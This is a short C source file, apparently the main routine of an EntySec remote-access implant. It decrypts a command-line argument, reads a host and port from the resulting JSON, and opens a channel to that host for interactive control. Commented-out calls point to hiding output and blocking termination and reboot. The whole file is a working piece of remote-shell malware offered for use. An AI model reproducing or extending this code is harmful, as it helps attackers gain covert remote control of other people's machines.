/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>

#include "json.h"
#include "utils.h"
#include "crypto.h"
#include "console.h"
#include "channel.h"

int main(int argc, char *argv[])
{
    if (argc > 1) {
        // redirect_to_null();

        // prevent_termination();
        // prevent_reboot();

        char *input = crypto_decrypt(argv[1]);
        JSONObject *json = parseJSON(input);

        char *host = find_json(json, "host");
        char *port = find_json(json, "port");

        freeJSONFromMemory(json);

        int channel = open_channel(host, atoi(port));
        if (channel < 0)
            return -1;

        interact(channel);
        close_channel(channel);
    } else
        return 1;

    return 0;
}
